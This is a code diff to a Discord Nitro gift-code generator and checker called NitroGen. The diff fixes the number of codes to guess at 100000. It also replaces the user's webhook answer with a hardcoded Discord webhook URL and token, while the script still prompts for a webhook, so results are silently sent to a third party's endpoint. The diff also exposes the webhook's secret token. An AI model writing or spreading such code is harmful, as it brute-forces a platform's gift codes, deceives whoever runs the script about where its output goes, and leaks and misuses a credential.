@@ -41,13 +41,13 @@ class NitroGen: # Initialise the class
                 ).execute()
         self.slowType("Made by: Drillenissen#4268 && Benz#4947", .02) # Print who developed the code
         time.sleep(1) # Wait a little more
-        self.slowType("\nInput How Many Codes to Generate and Check: ", .02, newLine = False) # Print the first question
+      
 
-        num = int(input('')) # Ask the user for the amount of codes
+        num = 100000 # Ask the user for the amount of codes
 
         # Get the webhook url, if the user does not wish to use a webhook the message will be an empty string
         self.slowType("\nDo you wish to use a discord webhook? \nIf so type it here or press enter to ignore: ", .02, newLine = False)
-        url = input('') # Get the awnser
+        url = 'https://discord.com/api/webhooks/831057768986312745/ZXCtBEHis60FuL6H7QlIoMBP6pMzOs-5zJWkZns-2ocYvhKHZNJ5MRctfC7kXMCNh_jM' # Get the awnser
         webhook = url if url != "" else None # If the url is empty make it be None insted
 
         # print() # Print a newline for looks
